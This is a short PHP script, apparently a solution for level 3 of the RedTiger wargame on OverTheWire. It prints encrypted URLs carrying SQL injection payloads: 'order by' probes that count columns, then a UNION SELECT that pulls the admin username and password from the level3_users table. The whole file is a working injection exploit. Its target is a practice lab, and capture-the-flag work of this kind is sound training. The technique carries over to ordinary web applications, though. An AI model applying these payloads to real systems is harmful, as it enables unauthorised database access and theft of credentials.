<?php
include("urlcrypt.inc");

$url = 'http://redtiger.labs.overthewire.org/level3.php?usr=';

$payload = 'admin\'order by 7 #';
echo $url.encrypt($payload)."\n";

$payload = 'admin\'order by 8 #';
echo $url.encrypt($payload)."\n";

$payload = '\' union select 1,username,3,password,5,6,7 from level3_users where username=\'admin\' #';
echo $url.encrypt($payload)."\n";
